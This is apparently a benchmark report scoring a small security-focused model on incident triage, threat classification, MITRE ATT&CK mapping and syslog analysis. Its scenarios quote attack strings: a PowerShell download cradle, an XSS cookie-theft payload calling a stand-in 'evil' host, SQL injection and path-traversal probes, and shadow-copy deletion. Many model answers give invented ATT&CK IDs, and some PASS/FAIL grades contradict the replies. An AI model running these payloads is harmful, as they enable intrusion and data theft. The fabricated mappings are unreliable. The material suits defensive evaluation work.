# Cybersecurity benchmark — `hf.co/koesn/ZySec-7B-v1-GGUF:Q4_K_M`
Model: `hf.co/koesn/ZySec-7B-v1-GGUF:Q4_K_M`
Run started: 2026-05-06 01:08:41

## Summary

| Section | Correct | Total | Accuracy |
|---|---|---|---|
| Incident recognition | 6 | 7 | 86% |
| Threat classification | 4 | 7 | 57% |
| MITRE ATT&CK mapping | 2 | 10 | 20% |
| Syslog triage (raw) | 5 | 8 | 62% |
| Syslog triage (drain3) | 5 | 8 | 62% |
| **Overall (with drain3)** | **17** | **32** | **53%** |

## 1. Incident recognition (binary)

### INC-1 — expected: **benign** — PASS (2.9s)
_Scenario_: User logs in from their normal office IP at 9:02am on a workday and opens email.

_Reply_: Bengin: User authentically accessed their email account from a known and trusted IP at the normal start of their workday.

### INC-2 — expected: **incident** — PASS (0.4s)
_Scenario_: Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.

_Reply_: Incident: Unauthorized remote access attempt detected from a compromised domain admin account. Time of activity indicates possible use of stolen credentials. Rapidly expanding RDP session suggests automated scanning or lateral movement by an attacker.

### INC-3 — expected: **incident** — PASS (0.3s)
_Scenario_: Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.

_Reply_: Incident: Mass SQL injection attack attempting to compromise WordPress admin accounts. Justification: High volume and frequency of POST requests targeting vulnerable WP-login.php endpoint, with successful logins indicating potential compromise.

### INC-4 — expected: **benign** — PASS (0.2s)
_Scenario_: A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.

_Reply_: Benben: Regularly scheduled backup job completed successfully. (40GB of data transferred normally.)

### INC-5 — expected: **incident** — PASS (0.3s)
_Scenario_: EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')

_Reply_: Incident: Abnormal PowerShell execution initiated from a document host (winword.exe). Communication with malicious domain detected.

### INC-6 — expected: **benign** — FAIL (0.2s)
_Scenario_: Developer pushes a commit to a feature branch, CI runs unit tests, all pass.

_Reply_: Bengin: Developers regularly push changes to feature branches and automated tests ensure the functionality works as intended.

### INC-7 — expected: **incident** — PASS (0.4s)
_Scenario_: DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.

_Reply_: Inc: Massive DNS reconnaissance attempt against a target domain. Justification: High volume and variety of subdomain queries indicate an attempt to discover valid subdomains and potentially gain unauthorized access through subdomain takeover or credential stuffing attacks.

## 2. Threat-type classification

### THR-1 — accepted keywords: ['ransomware'] — PASS (0.1s)
_Scenario_: Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.

_Reply_: Lockbit ransomware

_Match_: 'ransomware'

### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — FAIL (0.1s)
_Scenario_: Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.

_Reply_: Email spoofing / False sender

### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (0.1s)
_Scenario_: Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.

_Reply_: SQL injection

_Match_: 'sql injection'

### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (0.4s)
_Scenario_: A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.

_Reply_: Reflected XSS (reflected cross-site scripting) allows an attacker to execute malicious scripts on a user's browser by reflecting user input back to them in an unsanitized manner.

_Match_: 'xss'

### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — FAIL (0.2s)
_Scenario_: Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.

_Reply_: PowerShell empire remote access tool (RAT)

### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — PASS (0.2s)
_Scenario_: Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.

_Reply_: DDoS spoofed UDP flood against public DNS

_Match_: 'ddos'

### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — FAIL (0.1s)
_Scenario_: A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.

_Reply_: Supplier compromise leading to malicious updates/backdoors.

## 3. MITRE ATT&CK technique mapping

**Per-case results**

| Case | Scenario | Accepted IDs | Detected | Result |
|---|---|---|---|---|
| ATT-1 | An attacker sends a Word document containing a malicious macro to a... | `T1566.001, T1566, T1204.002, T1204` | `T1102.002,T1102.002` | FAIL |
| ATT-2 | Adversary uses Mimikatz to extract plaintext passwords and NTLM has... | `T1003.001, T1003` | `T1003` | PASS |
| ATT-3 | Attacker creates a new scheduled task on the victim host to run the... | `T1053.005, T1053` | `T1059.001,T1059.001,T1059,T1059.001` | FAIL |
| ATT-4 | After initial access, the attacker uses 'net group "Domain Admins" ... | `T1087.002, T1087, T1018, T1482` | `T1059.001,T1059.001` | FAIL |
| ATT-5 | Adversary establishes persistence by adding a value under HKCU\Soft... | `T1547.001, T1547` | `T1059.001` | FAIL |
| ATT-6 | C2 beaconing traffic is encoded as DNS TXT record queries to attack... | `T1071.004, T1071, T1048.003, T1048` | `T1047` | FAIL |
| ATT-7 | Attacker uses PsExec from a compromised workstation to execute a re... | `T1021.002, T1021, T1570, T1569.002` | `T1027,T1027.001` | FAIL |
| ATT-8 | Before encrypting victim files, the ransomware deletes Windows Volu... | `T1490` | `T1059.001,T1267.003` | FAIL |
| ATT-9 | A binary uses base64-encoded PowerShell with the -EncodedCommand fl... | `T1027, T1059.001, T1140` | `T1027` | PASS |
| ATT-10 | Attacker compresses sensitive files into a password-protected RAR a... | `T1560.001, T1560` | `T1059.001,T1059.001` | FAIL |

### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — FAIL (1.3s)
_Scenario_: An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.

_Reply_: Scenario: An attacker sends a phishing email with a link to a malicious website. The user clicks on the link, which leads to the execution of a script that downloads a payload. Question: Which MITRE ATT&CK technique best matches this behavior? Reply with the technique ID (e.g. T1102.002) and the technique name. Answer: T1102.002 - Phishing: Template or Pretext
Explanation: While the user's interaction with the phishing email leads to the execution of a script, the initial delivery vector is still a phishing email. The MITRE ATT&CK technique for phishing provides a high-level description of this behavior. To accurately represent the specific action taken by the attacker (i.e., sending a link), we can append ".002" to the technique ID to indicate the subtechnique used.

_Detected IDs_: T1102.002,T1102.002

### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — PASS (0.4s)
_Scenario_: Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.

_Reply_: Technique ID: T1003.002, Technique name: Obtain Files or Information from Memory (Stealth: Low) or T1059.001, Technique name: Credential Dumping - Mimikatz

_Detected IDs_: T1003

### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — FAIL (0.9s)
_Scenario_: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.

_Reply_: Scenario: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts. Question: Which MITRE ATT&CK technique best matches this behavior? Reply with the technique ID (e.g. T1059.001) and the technique name. Answer: T1059.001 - Scheduled Task/Job
or use the full name: Technique: Scheduled Task/Job (T1059) Subtechnique: Create or Modify a Scheduled Task/Job (T1059.001)

_Detected IDs_: T1059.001,T1059.001,T1059,T1059.001

### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — FAIL (0.7s)
_Scenario_: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment.

_Reply_: Scenario: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment. Question: Which MITRE ATT&CK technique best matches this behavior? Reply with the technique ID (e.g. T1059.001) and the technique name. Answer: T1059.001 - Query Registry or File Contents

_Detected IDs_: T1059.001,T1059.001

### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — FAIL (0.5s)
_Scenario_: Adversary establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run that points to their malware.

_Reply_: Scenario actor establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run to execute their malware on system startup. Technique: Persistence - Create/Modify Registry Run Key (T1059.001)

_Detected IDs_: T1059.001

### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — FAIL (0.5s)
_Scenario_: C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.

_Reply_: Scenario: Identify if a user is attempting to exfiltrate sensitive data through a cloud storage service. Answer: Detect abnormal activity in the user's cloud storage account, such as large or frequent uploads/downloads of sensitive data to/from unauthorized or unexpected destinations. (T1047) Exfiltration Over Cloud Storage Services

_Detected IDs_: T1047

### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — FAIL (0.6s)
_Scenario_: Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.

_Reply_: Scenario: Attacker uses PowerShell to execute a script on a target system through a compromised share point. Question: Which MITRE ATT&CK technique best matches this behavior? Reply with the technique ID (e.g. T1027) and the technique name. Answer: T1027.001 - PowerShell Empire: PowerShell Empire Remote File Execution (RFE)

_Detected IDs_: T1027,T1027.001

### ATT-8 — accepted IDs: ['T1490'] — FAIL (0.7s)
_Scenario_: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.

_Reply_: Scenario: Identify the MITRE ATT&CK technique that matches the behavior described. Report the technique ID and name. Example: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'. Technique ID and name: T1059.001 - Delete Volatile Data
or
Technique ID and name: T1267.003 - Clear Shadow Copies (Windows)

_Detected IDs_: T1059.001,T1267.003

### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — PASS (0.7s)
_Scenario_: A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.

_Reply_: Scenario: Identify the MITRE ATT&CK technique that matches the use of base64-encoded PowerShell with the -EncodedCommand flag to conceal its true payload from defenders. Reply with the technique ID and name. Example: T1027.003 - Base64 Encoded Scripting or Data

Response: T1027.003 - Base64 Encoded Scripting or Data

_Detected IDs_: T1027

### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — FAIL (0.8s)
_Scenario_: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.

_Reply_: Scenario: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration. Question: Which MITRE ATT&CK technique best matches this behavior? Reply with the technique ID (e.g. T1059.001) and the technique name. Answer: The attacker is using the technique T1059.001, Archive Files. They are compressing sensitive files into a password-protected RAR archive before exfiltration.

_Detected IDs_: T1059.001,T1059.001

## 4. Raw syslog triage (binary) — baseline vs drain3-augmented

### SYS-1 — SSH brute force followed by successful login — expected: **incident**
_Logs_:
```
Mar 10 03:41:02 webhost sshd[28401]: Failed password for invalid user admin from 185.220.101.45 port 47812 ssh2
Mar 10 03:41:05 webhost sshd[28403]: Failed password for invalid user root from 185.220.101.45 port 47815 ssh2
Mar 10 03:41:08 webhost sshd[28405]: Failed password for invalid user oracle from 185.220.101.45 port 47820 ssh2
Mar 10 03:41:11 webhost sshd[28407]: Failed password for invalid user postgres from 185.220.101.45 port 47824 ssh2
Mar 10 03:41:14 webhost sshd[28409]: Failed password for invalid user git from 185.220.101.45 port 47829 ssh2
Mar 10 03:41:17 webhost sshd[28411]: Failed password for invalid user test from 185.220.101.45 port 47833 ssh2
Mar 10 03:41:20 webhost sshd[28413]: Failed password for ubuntu from 185.220.101.45 port 47837 ssh2
Mar 10 03:43:21 webhost sshd[28571]: Accepted password for ubuntu from 185.220.101.45 port 47891 ssh2
Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

_drain3 templates_:
```
[x6] Mar 10 <*> webhost <*> Failed password for invalid user <*> from 185.220.101.45 port <*> ssh2
[x2] Mar 10 <*> webhost <*> <*> password for ubuntu from 185.220.101.45 port <*> ssh2
[x1] Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

**Baseline (raw only)** — PASS (0.6s)
_Reply_: Incident: Multiple failed login attempts for invalid users from a single IP address before successful login as ubuntu. Justification: Repeated and unsuccessful authentication attempts can indicate a brute-force attack or compromised credentials being used to attempt access. Successful login as a valid user after multiple failed attempts could indicate that the attacker was able to guess or crack the password for that account.

**With drain3 summary** — PASS (0.5s)
_Reply_: Incident: High number of failed password attempts for invalid users from a single IP address. Pattern summary: [x6] Mar 10 <*> webhost <*> Failed password for invalid user <*> from 185.220.101.45 port <*> ssh2

### SYS-2 — Normal pubkey login from internal range — expected: **benign**
_Logs_:
```
Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

_drain3 templates_:
```
[x1] Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
[x1] Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
[x1] Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

**Baseline (raw only)** — FAIL (0.7s)
_Reply_: Incident: Identified remote user 'alice' successfully authenticated via SSH with public key '7Hk2pQ...'. Session opened for user alice by root (UID 0). New session created for user alice by systemd-logind. Justification: Unusual or high-privileged user (root) initiating a session for another user raises suspicion. Identify if this is expected behavior or investigate further.

**With drain3 summary** — FAIL (0.6s)
_Reply_: Incident: Repeated successful login by user alice from a suspicious IP (10.0.4.22). Justification: High [x1] count on the first template indicates repeated successful logins, and the second template shows the session being opened for user alice by the system. The third template provides context that the user is alice. The combination of these templates suggests a potential compromise or unauthorized access attempt.

### SYS-3 — Daily cron run — expected: **benign**
_Logs_:
```
Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
[x1] Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
[x1] Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

**Baseline (raw only)** — PASS (0.6s)
_Reply_: Inc: Regular cron job executed by privileged user root at 02:00:01, but subsequent benign rsyslogd and PAM activity is expected. Justification: Identify and investigate the purpose of the 'test' command executed by the cron job. Evaluate if it aligns with normal system behavior or indicates a potential security issue. Monitor for similar activities from the same user or source IP.

**With drain3 summary** — FAIL (0.9s)
_Reply_: Incident: High [x1] count on attack-shaped template "Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))" suggests scheduled job being used for malicious activity. Justification: Attackers commonly use cron jobs to execute malicious scripts or commands on compromised systems. The presence of a root user and the execution of anacron, which is typically disabled by default, raises suspicion.

### SYS-4 — SQL injection probes in Apache access log — expected: **incident**
_Logs_:
```
185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:04 +0000] "GET /products.php?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 4129
185.62.190.13 - - [10/Mar/2026:14:22:05 +0000] "GET /products.php?id=1;DROP+TABLE+users-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:06 +0000] "GET /products.php?id=1+AND+SLEEP(5)-- HTTP/1.1" 200 4129
```

_drain3 templates_:
```
[x3] 185.62.190.13 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
[x1] 185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
```

**Baseline (raw only)** — FAIL (0.4s)
_Reply_: Incident: SQL injection attempt detected in log lines 1-3. Justification: Multiple attempts to exploit SQL injection vulnerability through crafted URL parameters. Log line 4 appears benign as it does not contain a SQL injection pattern.

**With drain3 summary** — PASS (0.4s)
_Reply_: Incident: High [x3] count on attack-shaped template indicates SQL injection attempt. Justification: Multiple variations of SQL injection attempts detected through log lines with different parameters and techniques (UNION, DROP TABLE).

### SYS-5 — Sudo adding service account to sudo group at 03:17 — expected: **incident**
_Logs_:
```
Mar 10 03:17:42 webhost sudo:      bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 03:17:42 webhost sudo: bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
[x1] Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
[x1] Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

**Baseline (raw only)** — FAIL (0.5s)
_Reply_: Inc: Unauthorized user bob added group svc_backup to the sudo group for user root. Justification: Normally, only the root user should be able to add users to the sudo group. The fact that a regular user (bob) is doing this raises suspicion and requires further investigation.

**With drain3 summary** — PASS (1.3s)
_Reply_: Incident: High count on usermod template indicates potential privilege escalation attempt by user bob adding group 'svc_backup' to user root. Evidence also seen in sudo and pam_unix logs. Justification: [x1] Mar 10 03:17:42 webhost sudo: bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup [x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo' [x1] Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root

### SYS-6 — Path traversal probes in Apache access log — expected: **incident**
_Logs_:
```
198.51.100.7 - - [10/Mar/2026:11:03:18 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2841
198.51.100.7 - - [10/Mar/2026:11:03:19 +0000] "GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 891
198.51.100.7 - - [10/Mar/2026:11:03:20 +0000] "GET /download?file=....//....//etc/hosts HTTP/1.1" 200 412
```

_drain3 templates_:
```
[x3] 198.51.100.7 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
```

**Baseline (raw only)** — PASS (0.6s)
_Reply_: Incident: Multiple attempts to access restricted resources through path traversal vulnerabilities. Justification: Three log entries show users attempting to access sensitive files using path traversal techniques. The first and third logs attempt to access 'etc/passwd' and 'etc/hosts', respectively, while the second log uses a similar technique to access 'etc/shadow'. These actions indicate potential unauthorized access attempts.

**With drain3 summary** — PASS (0.3s)
_Reply_: Incident: Multiple attempts to access restricted files through path traversal in /download resource. Template matches indicate potential file disclosure attempt.

### SYS-7 — Normal authenticated web session — expected: **benign**
_Logs_:
```
10.0.4.22 - alice [10/Mar/2026:10:14:02 +0000] "GET /dashboard HTTP/1.1" 200 18421 "https://intranet.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "GET /static/app.js HTTP/1.1" 200 84219 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "POST /api/v1/metrics HTTP/1.1" 200 142 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

_drain3 templates_:
```
[x3] 10.0.4.22 - alice <*> +0000] <*> <*> HTTP/1.1" 200 <*> <*> "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

**Baseline (raw only)** — PASS (0.4s)
_Reply_: Benben: Insufficient context to determine, but the user alice is accessing expected resources (dashboard and associated assets) via standard protocols (GET and POST). No anomalous patterns detected. Benign: Normal user activity identified based on known resource access patterns.

**With drain3 summary** — FAIL (0.4s)
_Reply_: Incident: Repeated POST request to sensitive API endpoint from internal user alice. Justification: Template with variable fields matches a POST request to an API endpoint with a small [x3] count, indicating potential misuse or unauthorized access attempt.

### SYS-8 — Windows 4625 burst then 4624 from same IP — expected: **incident**
_Logs_:
```
Mar 10 02:18:14 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:16 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:18 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:21 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:24 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

_drain3 templates_:
```
[x5] Mar 10 <*> dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
[x1] Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

**Baseline (raw only)** — PASS (0.5s)
_Reply_: Incident: Multiple failed administrator logins from IP 192.168.50.13 on KIOSK-04 within a short timeframe. Justification: Repeated failed login attempts can indicate a brute force attack or compromised credential being used to gain access.

**With drain3 summary** — PASS (0.4s)
_Reply_: Incident: Repeated failed logins with FailureReason=BadPassword from IP 192.168.50.13 on KIOSK-04.
